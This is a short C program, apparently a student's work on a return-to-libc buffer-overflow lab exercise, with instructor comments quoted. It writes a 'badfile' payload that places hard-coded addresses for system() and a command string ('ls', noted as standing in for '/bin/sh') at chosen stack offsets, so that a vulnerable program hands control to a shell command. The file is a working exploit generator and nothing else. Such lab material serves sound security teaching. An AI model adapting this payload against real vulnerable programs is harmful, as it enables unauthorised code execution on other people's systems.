#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;

  // Fill buffer with NOPs
  memset(&buf, 0x90, 40);
  buf[38] = 0x00;
  buf[39] = 0x00; 
  // Test system() with ls
  buf[16] = 'l';
  buf[17] = 's';
  buf[18] = 0x00;

  badfile = fopen("./badfile", "w");

  /* You need to decide the addresses and 
     the values for X, Y, Z. The order of the following 
     three statements does not imply the order of X, Y, Z.
     Actually, we intentionally scrambled the order. */
  *(long *) &buf[28] = 0xbffff454 ;   // currently "ls" "/bin/sh"
  *(long *) &buf[24] = 0xb7e9af10 ;   //  system()
  //*(long *) &buf[Z] = some address ;   //  exit()

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}
